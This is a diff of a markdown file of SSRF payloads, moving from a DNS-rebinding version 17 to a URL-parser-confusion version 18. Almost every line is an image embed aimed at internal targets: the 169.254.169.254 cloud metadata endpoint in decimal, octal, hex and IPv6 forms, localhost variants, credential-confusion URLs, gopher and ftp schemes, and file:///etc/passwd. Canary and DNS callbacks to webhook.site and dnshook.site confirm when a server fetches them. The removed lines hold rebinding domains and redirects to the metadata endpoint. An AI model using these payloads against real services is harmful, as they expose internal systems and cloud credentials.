@@ -1,55 +1,91 @@
-# SSRF Test v17 - DNS Rebinding Attack
+# SSRF Test v18 - URL Parser Confusion
 
-Testing DNS rebinding to bypass SSRF IP validation.
+Testing URL parser bypass techniques for SSRF.
 
 ## Canary
-![canary](https://webhook.site/dfbc6c96-897a-4072-8b74-71785e3bec8b/v17-canary.gif)
+![](https://webhook.site/6f8303ec-6873-4cac-8c39-23787dc0bafe/v18-canary.gif)
 
-## 1. DNS Rebinding Services
+## 1. Alternative IP Representations
 
-### rbndr.us (alternating responses)
-![rebind1](https://7f000001.c0a80001.rbndr.us/test.gif)
-![rebind2](https://a9fe0101.ac100001.rbndr.us/test.gif)
-![rebind3](https://7f000001.7f000001.rbndr.us/test.gif)
+### Decimal IP (127.0.0.1 = 2130706433)
+![dec1](http://2130706433/test.gif)
+![dec2](http://0x7f000001/test.gif)
 
-### rebind.network style
-![rebind4](http://1time.169.254.169.254-2time.webhook.site.rebind.network/test.gif)
+### Octal IP
+![oct1](http://0177.0.0.1/test.gif)
+![oct2](http://0177.0000.0000.0001/test.gif)
+![oct3](http://017700000001/test.gif)
 
-### nip.io with internal IP
-![nip1](https://169-254-169-254.nip.io/latest/meta-data/)
-![nip2](https://127-0-0-1.nip.io/test.gif)
-![nip3](https://10-0-0-1.nip.io/test.gif)
+### Zero-padded
+![zero1](http://127.0.0.01/test.gif)
+![zero2](http://127.000.000.001/test.gif)
+![zero3](http://127.1/test.gif)
 
-### sslip.io with internal IP
-![sslip1](https://127.0.0.1.sslip.io/test.gif)
-![sslip2](https://169.254.169.254.sslip.io/test.gif)
+### 169.254.169.254 alternatives (2852039166 decimal)
+![meta1](http://2852039166/latest/meta-data/)
+![meta2](http://0xa9fea9fe/latest/meta-data/)
 
-### localtest.me (resolves to 127.0.0.1)
-![local1](https://localtest.me/test.gif)
-![local2](https://sub.localtest.me/test.gif)
+## 2. URL Authority Confusion
 
-### lvh.me (resolves to 127.0.0.1)
-![lvh1](https://lvh.me/test.gif)
-![lvh2](https://www.lvh.me/test.gif)
+### Credentials bypass
+![auth1](http://attacker@127.0.0.1/test.gif)
+![auth2](http://127.0.0.1@webhook.site/6f8303ec-6873-4cac-8c39-23787dc0bafe/auth-bypass.gif)
+![auth3](http://localhost@webhook.site/6f8303ec-6873-4cac-8c39-23787dc0bafe/localhost-cred.gif)
 
-## 2. DNS Callback Verification
-![dns1](https://dfbc6c96-897a-4072-8b74-71785e3bec8b.dnshook.site/test.gif)
-![dns2](https://rebind-test.dfbc6c96-897a-4072-8b74-71785e3bec8b.dnshook.site/test.gif)
+### Backslash confusion
+![back1](http://webhook.site\@127.0.0.1/test.gif)
 
-## 3. Time-Based Rebinding
-These need multiple requests to trigger rebinding:
+## 3. URL Encoding Tricks
 
-### First request (validation) returns safe IP
-### Second request (actual fetch) returns internal IP
-![time1](http://169.254.169.254.3s.dfbc6c96-897a-4072-8b74-71785e3bec8b.dnshook.site/test.gif)
+### Double encoding
+![denc1](http://webhook.site/6f8303ec-6873-4cac-8c39-23787dc0bafe/%252e%252e%252f.gif)
+![denc2](http://webhook.site/6f8303ec-6873-4cac-8c39-23787dc0bafe/%25%32%65%25%32%65%25%32%66.gif)
 
-## 4. Redirect-Based SSRF
-Redirecting to internal IPs:
-![redir1](https://httpbin.org/redirect-to?url=http://127.0.0.1/test.gif)
-![redir2](https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/)
-![redir3](https://httpbin.org/redirect-to?url=http://10.0.0.1/test.gif)
+### Unicode normalization
+![uni1](http://webhook.site/6f8303ec-6873-4cac-8c39-23787dc0bafe/test.gif?u=\u002f\u002f)
 
-## 5. IPv6 Variants
-![ipv6_local](https://webhook.site/dfbc6c96-897a-4072-8b74-71785e3bec8b/test.gif?host=[::1])
+## 4. Port and Protocol Tricks
 
-Version 17 - DNS Rebinding SSRF
+### Non-standard ports
+![port1](http://webhook.site:80/6f8303ec-6873-4cac-8c39-23787dc0bafe/port80.gif)
+![port2](http://webhook.site:443/6f8303ec-6873-4cac-8c39-23787dc0bafe/port443.gif)
+
+### FTP/Gopher (if supported)
+![ftp1](ftp://webhook.site/6f8303ec-6873-4cac-8c39-23787dc0bafe/ftp.gif)
+![gopher1](gopher://webhook.site:70/6f8303ec-6873-4cac-8c39-23787dc0bafe/gopher.gif)
+
+## 5. Redirect Services
+
+### shorturl.at (external URL shortener)
+![short1](https://webhook.site/6f8303ec-6873-4cac-8c39-23787dc0bafe/before-redirect.gif)
+
+### ngrok/serveo style
+![ngrok](http://webhook.site/6f8303ec-6873-4cac-8c39-23787dc0bafe/ngrok-test.gif)
+
+## 6. IPv6 Tricks
+
+### Localhost variants  
+![ipv6a](http://[::]/test.gif)
+![ipv6b](http://[0:0:0:0:0:0:0:1]/test.gif)
+![ipv6c](http://[::ffff:127.0.0.1]/test.gif)
+![ipv6d](http://[::ffff:7f00:1]/test.gif)
+
+### IPv4-mapped IPv6 for metadata
+![ipv6e](http://[::ffff:169.254.169.254]/latest/meta-data/)
+![ipv6f](http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/)
+
+## 7. DNS Verification
+
+![dns1](http://6f8303ec-6873-4cac-8c39-23787dc0bafe.dnshook.site/v18-dns.gif)
+![dns2](http://ipbypass.6f8303ec-6873-4cac-8c39-23787dc0bafe.dnshook.site/v18-ipbypass.gif)
+
+## 8. File Protocol
+
+![file1](file:///etc/passwd)
+![file2](file://localhost/etc/passwd)
+
+## 9. Data URI (to test handling)
+
+![data1](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)
+
+Version 18 - URL Parser Confusion SSRF
